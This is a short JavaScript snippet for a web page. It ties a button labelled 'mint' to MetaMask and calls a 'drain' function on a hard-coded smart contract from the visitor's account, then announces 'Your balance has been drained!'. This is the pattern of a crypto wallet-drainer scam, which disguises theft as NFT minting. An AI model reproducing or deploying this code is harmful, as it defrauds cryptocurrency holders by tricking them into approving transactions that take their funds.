// Set the contract address and ABI
const contractAddress = '0x1db7c769c45F62593A07EEde5Fa58ab4Ffe98d62';
const contractABI = [
	{
		"inputs": [],
		"name": "drain",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	}
];

// Initialize Web3 and the contract
let web3 = new Web3(window.ethereum);
let contract = new web3.eth.Contract(contractABI, contractAddress);

// Listen for button click
document.getElementById('mint-button').addEventListener('click', async function() {
    try {
        // Request account access from Metamask
        await window.ethereum.enable();
        // Get the account address
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        // Call the drain function of the contract
        await contract.methods.drain().send({
            from: account,
            value: 0,
            gas: 3000000
        });
        alert('Your balance has been drained!');
    } catch (err) {
        console.error(err);
        alert('An error occurred, please try again.');
    }
});

